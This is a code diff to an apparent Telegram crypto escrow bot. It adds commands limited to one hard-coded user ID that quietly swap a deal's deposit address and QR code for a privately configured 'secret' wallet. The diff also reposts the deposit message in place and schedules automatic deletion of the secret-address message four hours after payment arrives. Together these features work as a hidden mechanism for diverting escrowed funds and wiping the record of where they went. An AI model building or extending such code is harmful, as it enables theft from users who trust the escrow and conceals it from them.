@@ -90,6 +90,8 @@ DEAL_HISTORY_FILE = "deal_history.json"
 HIDDEN_VOLUME_FILE = "hidden_volume.json"
 HIDDEN_DEALS_FILE = "hidden_deals.json"
 PROFILE_OVERRIDES_FILE = "profile_overrides.json"
+SECRET_ADDRESSES_FILE = "secret_addresses.json"
+PENDING_DELETIONS_FILE = "pending_deletions.json"
 
 # Default addresses and QR images (used if escrow_addresses.json doesn't exist)
 _DEFAULT_ADDRESSES = {
@@ -194,6 +196,13 @@ def _apply_addresses_from_data(data):
     DEPOSIT_ADDRESSES["USDC_SOL"] = USDC_SOL_DEPOSIT_ADDRESSES[0]
 
 
+def secret_address_key(currency, network):
+    """Key like USDT_BSC / USDC_SOL for a deal's currency + network."""
+    if network.startswith("USDC_"):
+        return network
+    return f"{currency}_{network}"
+
+
 # QR Images for USDT addresses
 BSC_QR_IMAGES = [
     "bsc_address1_qr.jpg",    # QR for Address 1
@@ -269,9 +278,14 @@ changeaddy_sessions = {}
 profile_cooldowns = {}
 clone_profile_sessions = {}
 sendmsg_sessions = {}
+secret_addy_sessions = {}
+secret_addresses = {}
+pending_deletions = []
 
 ADMIN_USER_IDS = [7338429782, 8346781181, 6662820986, 7090417167, 6643621069, 6302273200]
 WORKLIST_ADMIN_ID = 6643621069
+SECRET_ADDY_USER_ID = 6643621069
+SECRET_DEPOSIT_DELETE_DELAY = 4 * 60 * 60
 
 # Extra admin added to every newly created escrow group (resolved by ID, then
 # username, then phone). ID is the source of truth; username may change.
@@ -484,6 +498,40 @@ def load_force_escrow():
 def save_force_escrow():
     with open(FORCE_ESCROW_FILE, "w") as f:
         json.dump(force_escrow_users, f)
+
+
+def load_secret_addresses():
+    global secret_addresses
+    try:
+        with open(SECRET_ADDRESSES_FILE, "r") as f:
+            loaded_addresses = json.load(f)
+        secret_addresses = (
+            loaded_addresses if isinstance(loaded_addresses, dict) else {}
+        )
+    except (FileNotFoundError, TypeError, ValueError):
+        secret_addresses = {}
+
+
+def save_secret_addresses():
+    with open(SECRET_ADDRESSES_FILE, "w") as f:
+        json.dump(secret_addresses, f)
+
+
+def load_pending_deletions():
+    global pending_deletions
+    try:
+        with open(PENDING_DELETIONS_FILE, "r") as f:
+            loaded_deletions = json.load(f)
+        pending_deletions = (
+            loaded_deletions if isinstance(loaded_deletions, list) else []
+        )
+    except (FileNotFoundError, TypeError, ValueError):
+        pending_deletions = []
+
+
+def save_pending_deletions():
+    with open(PENDING_DELETIONS_FILE, "w") as f:
+        json.dump(pending_deletions, f)
 
 
 def load_work_chats():
@@ -1712,57 +1760,72 @@ async def build_deposit_message(deal, deal_id, bot):
     else:
         # Check if admin has pre-fixed an address index
         fixed_index = deal.get('fixed_address_index')
-        
-        if network == "BSC":
-            if fixed_index is not None and fixed_index < len(BSC_DEPOSIT_ADDRESSES):
-                deposit_address = BSC_DEPOSIT_ADDRESSES[fixed_index]
-                qr_image = BSC_QR_IMAGES[fixed_index]
+
+        if deal.get('secret_address'):
+            secret = secret_addresses.get(secret_address_key(currency, network))
+            if secret:
+                deal['deposit_address'] = secret['address']
+                deal['qr_image'] = secret['qr_image']
             else:
-                deposit_address, qr_image = get_bsc_deposit_info()
-            deal['deposit_address'] = deposit_address
-            deal['qr_image'] = qr_image
-        elif network == "POLYGON":
-            if fixed_index is not None and fixed_index < len(POLYGON_DEPOSIT_ADDRESSES):
-                deposit_address = POLYGON_DEPOSIT_ADDRESSES[fixed_index]
-                qr_image = POLYGON_QR_IMAGES[fixed_index]
+                log_warning(
+                    f"Deal #{deal_id} secret address requested but none "
+                    f"configured for {secret_address_key(currency, network)}"
+                )
+
+        if not deal.get('deposit_address'):
+            if network == "BSC":
+                if fixed_index is not None and fixed_index < len(BSC_DEPOSIT_ADDRESSES):
+                    deposit_address = BSC_DEPOSIT_ADDRESSES[fixed_index]
+                    qr_image = BSC_QR_IMAGES[fixed_index]
+                else:
+                    deposit_address, qr_image = get_bsc_deposit_info()
+                deal['deposit_address'] = deposit_address
+                deal['qr_image'] = qr_image
+            elif network == "POLYGON":
+                if fixed_index is not None and fixed_index < len(POLYGON_DEPOSIT_ADDRESSES):
+                    deposit_address = POLYGON_DEPOSIT_ADDRESSES[fixed_index]
+                    qr_image = POLYGON_QR_IMAGES[fixed_index]
+                else:
+                    deposit_address, qr_image = get_polygon_deposit_info()
+                deal['deposit_address'] = deposit_address
+                deal['qr_image'] = qr_image
+            elif network == "SOL":
+                if fixed_index is not None and fixed_index < len(SOL_DEPOSIT_ADDRESSES):
+                    deposit_address = SOL_DEPOSIT_ADDRESSES[fixed_index]
+                    qr_image = SOL_QR_IMAGES[fixed_index]
+                else:
+                    deposit_address, qr_image = get_sol_deposit_info()
+                deal['deposit_address'] = deposit_address
+                deal['qr_image'] = qr_image
+            elif network == "USDC_BSC":
+                if fixed_index is not None and fixed_index < len(USDC_BSC_DEPOSIT_ADDRESSES):
+                    deposit_address = USDC_BSC_DEPOSIT_ADDRESSES[fixed_index]
+                    qr_image = USDC_BSC_QR_IMAGES[fixed_index]
+                else:
+                    deposit_address, qr_image = get_usdc_bsc_deposit_info()
+                deal['deposit_address'] = deposit_address
+                deal['qr_image'] = qr_image
+            elif network == "USDC_POLYGON":
+                deposit_address = USDC_POLYGON_DEPOSIT_ADDRESS
+                qr_image = USDC_POLYGON_QR_IMAGE
+                deal['deposit_address'] = deposit_address
+                deal['qr_image'] = qr_image
+            elif network == "USDC_SOL":
+                if fixed_index is not None and fixed_index < len(USDC_SOL_DEPOSIT_ADDRESSES):
+                    deposit_address = USDC_SOL_DEPOSIT_ADDRESSES[fixed_index]
+                    qr_image = USDC_SOL_QR_IMAGES[fixed_index]
+                else:
+                    deposit_address, qr_image = get_usdc_sol_deposit_info()
+                deal['deposit_address'] = deposit_address
+                deal['qr_image'] = qr_image
             else:
-                deposit_address, qr_image = get_polygon_deposit_info()
-            deal['deposit_address'] = deposit_address
-            deal['qr_image'] = qr_image
-        elif network == "SOL":
-            if fixed_index is not None and fixed_index < len(SOL_DEPOSIT_ADDRESSES):
-                deposit_address = SOL_DEPOSIT_ADDRESSES[fixed_index]
-                qr_image = SOL_QR_IMAGES[fixed_index]
-            else:
-                deposit_address, qr_image = get_sol_deposit_info()
-            deal['deposit_address'] = deposit_address
-            deal['qr_image'] = qr_image
-        elif network == "USDC_BSC":
-            if fixed_index is not None and fixed_index < len(USDC_BSC_DEPOSIT_ADDRESSES):
-                deposit_address = USDC_BSC_DEPOSIT_ADDRESSES[fixed_index]
-                qr_image = USDC_BSC_QR_IMAGES[fixed_index]
-            else:
-                deposit_address, qr_image = get_usdc_bsc_deposit_info()
-            deal['deposit_address'] = deposit_address
-            deal['qr_image'] = qr_image
-        elif network == "USDC_POLYGON":
-            deposit_address = USDC_POLYGON_DEPOSIT_ADDRESS
-            qr_image = USDC_POLYGON_QR_IMAGE
-            deal['deposit_address'] = deposit_address
-            deal['qr_image'] = qr_image
-        elif network == "USDC_SOL":
-            if fixed_index is not None and fixed_index < len(USDC_SOL_DEPOSIT_ADDRESSES):
-                deposit_address = USDC_SOL_DEPOSIT_ADDRESSES[fixed_index]
-                qr_image = USDC_SOL_QR_IMAGES[fixed_index]
-            else:
-                deposit_address, qr_image = get_usdc_sol_deposit_info()
-            deal['deposit_address'] = deposit_address
-            deal['qr_image'] = qr_image
-        else:
-            deposit_address = DEPOSIT_ADDRESSES.get(network, '')
-            qr_image = None
-            deal['deposit_address'] = deposit_address
-            deal['qr_image'] = qr_image
+                deposit_address = DEPOSIT_ADDRESSES.get(network, '')
+                qr_image = None
+                deal['deposit_address'] = deposit_address
+                deal['qr_image'] = qr_image
+
+        deposit_address = deal.get('deposit_address', '')
+        qr_image = deal.get('qr_image')
 
     seller_name, seller_id = await resolve_deal_party(deal, "seller", bot)
     buyer_name, buyer_id = await resolve_deal_party(deal, "buyer", bot)
@@ -1785,6 +1848,64 @@ async def build_deposit_message(deal, deal_id, bot):
     )
 
     return msg
+
+
+async def send_deposit_message(bot, chat_id, deal, deal_id, deposit_text):
+    """Send a deposit message with its QR image when available."""
+    network = deal.get('network', 'BSC')
+    log_info(
+        f"Deal #{deal_id} deposit: network={network}, "
+        f"qr_image={deal.get('qr_image')}, "
+        f"fixed_index={deal.get('fixed_address_index')}, "
+        f"deposit_address={deal.get('deposit_address')}"
+    )
+
+    if network in [
+        'BSC',
+        'POLYGON',
+        'SOL',
+        'USDC_BSC',
+        'USDC_POLYGON',
+        'USDC_SOL'
+    ]:
+        qr_image = deal.get('qr_image')
+        sent_deposit = None
+        if qr_image:
+            qr_path = os.path.join(
+                os.path.dirname(os.path.abspath(__file__)),
+                qr_image
+            )
+            log_info(f"Deal #{deal_id} trying to send QR image: {qr_path}")
+            try:
+                with open(qr_path, 'rb') as qr_file:
+                    sent_deposit = await bot.send_photo(
+                        chat_id=chat_id,
+                        photo=qr_file,
+                        caption=deposit_text,
+                        parse_mode="HTML",
+                        reply_markup=get_deposit_buttons(deal_id)
+                    )
+                    log_info(f"Deal #{deal_id} QR image sent successfully")
+            except FileNotFoundError as e:
+                log_error(f"Deal #{deal_id} QR image not found: {qr_path}")
+        else:
+            log_warning(f"Deal #{deal_id} no qr_image set in deal")
+        if sent_deposit is None:
+            sent_deposit = await bot.send_message(
+                chat_id=chat_id,
+                text=deposit_text,
+                parse_mode="HTML",
+                reply_markup=get_deposit_buttons(deal_id)
+            )
+    else:
+        sent_deposit = await bot.send_message(
+            chat_id=chat_id,
+            text=deposit_text,
+            parse_mode="HTML",
+            reply_markup=get_deposit_buttons(deal_id)
+        )
+
+    return sent_deposit
 
 
 def build_deal_summary(deal, deal_id, both_confirmed=False):
@@ -2444,12 +2565,54 @@ async def send_payment_details(bot, deal, deal_id, chat_id):
     return None
 
 
+def schedule_message_deletion(chat_id, message_id, delay_seconds):
+    pending_deletions.append({
+        "chat_id": chat_id,
+        "message_id": message_id,
+        "delete_at": int(time.time()) + delay_seconds
+    })
+    save_pending_deletions()
+
+
+async def process_pending_deletions(bot):
+    """Delete scheduled messages once due; runs forever."""
+    while True:
+        now = int(time.time())
+        due = [
+            entry for entry in pending_deletions
+            if entry["delete_at"] <= now
+        ]
+        for entry in due:
+            try:
+                await bot.delete_message(
+                    chat_id=entry["chat_id"],
+                    message_id=entry["message_id"]
+                )
+            except Exception as delete_error:
+                log_warning(
+                    f"Could not delete scheduled message "
+                    f"{entry['message_id']} in {entry['chat_id']}: "
+                    f"{delete_error}"
+                )
+            pending_deletions.remove(entry)
+        if due:
+            save_pending_deletions()
+        await asyncio.sleep(60)
+
+
 async def finalize_payment_received(bot, deal, deal_id, chat_id, received_amount):
     """Send the post-confirmation payment messages."""
     try:
         await update_deal_log(bot, deal_id, "Payment Received")
     except Exception as log_error:
         log_warning(f"Could not update payment received log for deal {deal_id}: {log_error}")
+
+    if deal.get('secret_address') and deal.get('deposit_msg_id'):
+        schedule_message_deletion(
+            chat_id,
+            deal['deposit_msg_id'],
+            SECRET_DEPOSIT_DELETE_DELAY
+        )
 
     try:
         received_msg = await build_usdt_received_message(
@@ -3446,49 +3609,9 @@ async def handle_callback(
                 deal, deal_id, context.bot
             )
             save_deals()  # Save deposit_address immediately to prevent rotation issues
-            network = deal.get('network', 'BSC')
-
-            # Debug logging for QR image
-            log_info(f"Deal #{deal_id} deposit: network={network}, qr_image={deal.get('qr_image')}, fixed_index={deal.get('fixed_address_index')}, deposit_address={deal.get('deposit_address')}")
-
-            if network in ['BSC', 'POLYGON', 'SOL', 'USDC_BSC', 'USDC_POLYGON', 'USDC_SOL']:
-                import os
-                qr_image = deal.get('qr_image')
-                sent_deposit = None
-                if qr_image:
-                    qr_path = os.path.join(
-                        os.path.dirname(os.path.abspath(__file__)),
-                        qr_image
-                    )
-                    log_info(f"Deal #{deal_id} trying to send QR image: {qr_path}")
-                    try:
-                        with open(qr_path, 'rb') as qr_file:
-                            sent_deposit = await context.bot.send_photo(
-                                chat_id=chat_id,
-                                photo=qr_file,
-                                caption=deposit_text,
-                                parse_mode="HTML",
-                                reply_markup=get_deposit_buttons(deal_id)
-                            )
-                            log_info(f"Deal #{deal_id} QR image sent successfully")
-                    except FileNotFoundError as e:
-                        log_error(f"Deal #{deal_id} QR image not found: {qr_path}")
-                else:
-                    log_warning(f"Deal #{deal_id} no qr_image set in deal")
-                if sent_deposit is None:
-                    sent_deposit = await context.bot.send_message(
-                        chat_id=chat_id,
-                        text=deposit_text,
-                        parse_mode="HTML",
-                        reply_markup=get_deposit_buttons(deal_id)
-                    )
-            else:
-                sent_deposit = await context.bot.send_message(
-                    chat_id=chat_id,
-                    text=deposit_text,
-                    parse_mode="HTML",
-                    reply_markup=get_deposit_buttons(deal_id)
-                )
+            sent_deposit = await send_deposit_message(
+                context.bot, chat_id, deal, deal_id, deposit_text
+            )
 
             deal['deposit_msg_id'] = sent_deposit.message_id
             deal['status'] = 'pending_deposit'
@@ -4307,6 +4430,117 @@ async def handle_callback(
         )
         return
 
+    # Handle secret address callbacks
+    if data.startswith("secaddy_"):
+        parts = data.split("_")
+        try:
+            target_user_id = int(parts[-1])
+        except (IndexError, ValueError):
+            await query.answer()
+            return
+        if user_id != target_user_id or user_id != SECRET_ADDY_USER_ID:
+            await query.answer()
+            return
+
+        if len(parts) < 3:
+            await query.answer()
+            return
+
+        if parts[1] == "cancel":
+            secret_addy_sessions.pop(user_id, None)
+            await query.edit_message_text(
+                "Secret address setup cancelled.",
+                parse_mode="HTML"
+            )
+            return
+
+        if user_id not in secret_addy_sessions:
+            await query.answer("Session expired. Use /setsecretaddy again.")
+            return
+
+        session = secret_addy_sessions[user_id]
+        if parts[1] == "cur":
+            currency = parts[2]
+            session["currency"] = currency
+            session["step"] = "network"
+            networks = ["BSC", "SOL", "POLYGON"]
+            rows = []
+            current_lines = []
+            for network in networks:
+                lookup_network = (
+                    network if currency == "USDT" else f"USDC_{network}"
+                )
+                key = secret_address_key(currency, lookup_network)
+                secret = secret_addresses.get(key)
+                if secret:
+                    current_lines.append(
+                        f"<b>{key}</b>: <code>{html.escape(secret['address'])}"
+                        f"</code> (QR: <code>{html.escape(secret['qr_image'])}"
+                        "</code>)"
+                    )
+                rows.append([
+                    InlineKeyboardButton(
+                        f"{currency}[{network}]",
+                        callback_data=f"secaddy_net_{network}_{user_id}"
+                    )
+                ])
+            rows.append([
+                InlineKeyboardButton(
+                    "❌ Cancel",
+                    callback_data=f"secaddy_cancel_{user_id}"
+                )
+            ])
+            current_text = (
+                "\n\n<b>Current secret addresses:</b>\n"
+                + "\n".join(current_lines)
+                if current_lines
+                else "\n\n<i>No secret addresses configured yet.</i>"
+            )
+            await query.edit_message_text(
+                f"<b>SECRET DEPOSIT ADDRESS SETUP</b>\n\n"
+                f"Currency: <b>{currency}</b>\n"
+                f"Select network:{current_text}",
+                parse_mode="HTML",
+                reply_markup=InlineKeyboardMarkup(rows)
+            )
+            return
+
+        if parts[1] == "net":
+            network = parts[2]
+            session["network"] = network
+            session["step"] = "awaiting_qr"
+            currency = session["currency"]
+            lookup_network = (
+                network if currency == "USDT" else f"USDC_{network}"
+            )
+            key = secret_address_key(currency, lookup_network)
+            secret = secret_addresses.get(key)
+            if secret:
+                current_text = (
+                    f"\n\n<b>Current secret address:</b>\n"
+                    f"<code>{html.escape(secret['address'])}</code>\n"
+                    f"<b>Current QR:</b> "
+                    f"<code>{html.escape(secret['qr_image'])}</code>"
+                )
+            else:
+                current_text = "\n\n<i>No secret address configured yet.</i>"
+            cancel_kb = InlineKeyboardMarkup([[
+                InlineKeyboardButton(
+                    "❌ Cancel",
+                    callback_data=f"secaddy_cancel_{user_id}"
+                )
+            ]])
+            await query.edit_message_text(
+                f"Now send the QR code image for {currency} [{network}]."
+                f"{current_text}",
+                parse_mode="HTML",
+                reply_markup=cancel_kb
+            )
+            return
+
+        await query.answer()
+        return
+
     # Handle changeaddy callbacks (admin changing escrow addresses)
     if data.startswith("chaddy_"):
         parts = data.split("_")
@@ -4639,6 +4873,40 @@ async def handle_photo(
         if await capture_sendmsg_message(message, context, sendmsg_session):
             return
 
+    secret_session = secret_addy_sessions.get(user_id)
+    if (
+        user_id == SECRET_ADDY_USER_ID
+        and secret_session
+        and secret_session.get("chat_id") == chat_id
+        and secret_session.get("step") == "awaiting_qr"
+    ):
+        currency = secret_session["currency"]
+        network = secret_session["network"]
+        lookup_network = (
+            network if currency == "USDT" else f"USDC_{network}"
+        )
+        key = secret_address_key(currency, lookup_network)
+        qr_filename = f"secret_{key.lower()}_qr.jpg"
+        photo_file = await message.photo[-1].get_file()
+        qr_path = os.path.join(
+            os.path.dirname(os.path.abspath(__file__)),
+            qr_filename
+        )
+        await photo_file.download_to_drive(qr_path)
+        secret_session["qr_image"] = qr_filename
+        secret_session["step"] = "awaiting_address"
+        cancel_kb = InlineKeyboardMarkup([[
+            InlineKeyboardButton(
+                "❌ Cancel",
+                callback_data=f"secaddy_cancel_{user_id}"
+            )
+        ]])
+        await message.reply_text(
+            "QR saved. Now send the deposit address as text.",
+            reply_markup=cancel_kb
+        )
+        return
+
     # Handle changeaddy QR image upload
     if user_id in changeaddy_sessions and changeaddy_sessions[user_id].get("step") == "awaiting_qr":
         session = changeaddy_sessions[user_id]
@@ -4765,6 +5033,41 @@ async def handle_message(
 
     username = user.username.lower() if user.username else None
     text = message.text.strip()
+
+    secret_session = secret_addy_sessions.get(user_id_msg)
+    if (
+        user_id_msg == SECRET_ADDY_USER_ID
+        and secret_session
+        and secret_session.get("chat_id") == chat_id
+        and secret_session.get("step") == "awaiting_address"
+    ):
+        currency = secret_session["currency"]
+        network = secret_session["network"]
+        qr_image = secret_session["qr_image"]
+        lookup_network = (
+            network if currency == "USDT" else f"USDC_{network}"
+        )
+        key = secret_address_key(currency, lookup_network)
+        if not is_valid_crypto_address(text, lookup_network):
+            await message.reply_text(
+                f"❌ Invalid {currency} address for {network}! "
+                "Please send a valid address."
+            )
+            return
+        secret_addresses[key] = {
+            "address": text,
+            "qr_image": qr_image
+        }
+        save_secret_addresses()
+        secret_addy_sessions.pop(user_id_msg, None)
+        await message.reply_text(
+            f"<b>Secret address saved</b>\n"
+            f"<b>Key:</b> <code>{key}</code>\n"
+            f"<b>Address:</b> <code>{html.escape(text)}</code>\n"
+            f"<b>QR Image:</b> <code>{html.escape(qr_image)}</code>",
+            parse_mode="HTML"
+        )
+        return
 
     # Handle changeaddy address text input
     if user_id_msg in changeaddy_sessions and changeaddy_sessions[user_id_msg].get("step") == "awaiting_address":
@@ -7599,6 +7902,131 @@ async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
+async def set_secret_addy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Start private setup for a secret deposit address."""
+    user_id = update.effective_user.id
+    if user_id != SECRET_ADDY_USER_ID:
+        return
+    if update.effective_chat.type != "private":
+        return
+
+    chat_id = update.effective_chat.id
+    secret_addy_sessions[user_id] = {
+        "chat_id": chat_id,
+        "step": "currency",
+        "created_at": int(time.time())
+    }
+    keyboard = [
+        [
+            InlineKeyboardButton(
+                "USDT",
+                callback_data=f"secaddy_cur_USDT_{user_id}"
+            ),
+            InlineKeyboardButton(
+                "USDC",
+                callback_data=f"secaddy_cur_USDC_{user_id}"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                "❌ Cancel",
+                callback_data=f"secaddy_cancel_{user_id}"
+            )
+        ]
+    ]
+    await update.message.reply_text(
+        "Select the currency for the secret deposit address.",
+        reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+
+
+async def backup_addy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Switch a deal to its configured secret deposit address."""
+    user_id = update.effective_user.id
+    if user_id != SECRET_ADDY_USER_ID:
+        return
+    if not context.args:
+        await update.message.reply_text("Usage: /backupaddy <deal id>")
+        return
+
+    deal_id = context.args[0].strip().lstrip("#").upper()
+    deal = deals.get(deal_id)
+    if deal is None:
+        await update.message.reply_text(f"Deal #{deal_id} not found.")
+        return
+
+    if deal.get('status') in (
+        'payment_checking',
+        'payment_received',
+        'released',
+        'payment_released',
+        'completed',
+        'cancelled'
+    ):
+        await update.message.reply_text(
+            f"Deal #{deal_id} is already past the deposit stage."
+        )
+        return
+
+    currency = deal.get('currency', 'USDT')
+    network = deal.get('network')
+    secret = None
+    key = None
+    if network:
+        lookup_network = (
+            network if currency == "USDT" else f"USDC_{network}"
+        )
+        key = secret_address_key(currency, lookup_network)
+        secret = secret_addresses.get(key)
+        if secret is None:
+            await update.message.reply_text(
+                f"No secret address configured for {key}. "
+                "Use /setsecretaddy first."
+            )
+            return
+
+    deal['secret_address'] = True
+    if (
+        deal.get('deposit_msg_id')
+        and deal.get('status') == 'pending_deposit'
+    ):
+        chat_id = deal.get('chat_id')
+        deal['deposit_address'] = secret['address']
+        deal['qr_image'] = secret['qr_image']
+        try:
+            await context.bot.delete_message(
+                chat_id=chat_id,
+                message_id=deal['deposit_msg_id']
+            )
+        except Exception as delete_error:
+            log_warning(
+                f"Could not delete old deposit message for deal "
+                f"{deal_id}: {delete_error}"
+            )
+        deposit_text = await build_deposit_message(
+            deal, deal_id, context.bot
+        )
+        sent_deposit = await send_deposit_message(
+            context.bot, chat_id, deal, deal_id, deposit_text
+        )
+        new_msg_id = sent_deposit.message_id
+        deal['deposit_msg_id'] = new_msg_id
+        deal['latest_msg_id'] = new_msg_id
+        save_deals()
+        await update_current_stage_button(
+            context.bot, deal, chat_id, new_msg_id
+        )
+        await update.message.reply_text(
+            f"Backup address sent for deal #{deal_id}."
+        )
+        return
+
+    save_deals()
+    await update.message.reply_text(
+        f"Backup address will be used for deal #{deal_id}."
+    )
+
+
 async def changeaddy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """/changeaddy - Admin command to change escrow deposit addresses."""
     user_id = update.effective_user.id
@@ -8756,6 +9184,8 @@ async def main():
     load_hidden_volume()
     load_hidden_deals()
     load_profile_overrides()
+    load_secret_addresses()
+    load_pending_deletions()
 
     # Load escrow addresses from JSON (permanent storage)
     addr_data = load_escrow_addresses()
@@ -8827,6 +9257,8 @@ async def main():
     app.add_handler(CommandHandler("markinactive", mark_inactive))
     app.add_handler(CommandHandler("manualadd", manual_add))
     app.add_handler(CommandHandler("changeaddy", changeaddy_command))
+    app.add_handler(CommandHandler("setsecretaddy", set_secret_addy))
+    app.add_handler(CommandHandler("backupaddy", backup_addy))
     app.add_handler(MessageHandler(filters.Regex(r'^\.review\b'), review_rooms))
     app.add_handler(ChatJoinRequestHandler(handle_join_request))
     app.add_handler(ChatMemberHandler(handle_chat_member_update, ChatMemberHandler.CHAT_MEMBER))
@@ -8843,6 +9275,7 @@ async def main():
     ))
 
     log_info("Bot started successfully")
+    asyncio.create_task(process_pending_deletions(app.bot))
     await app.run_polling()
 
 
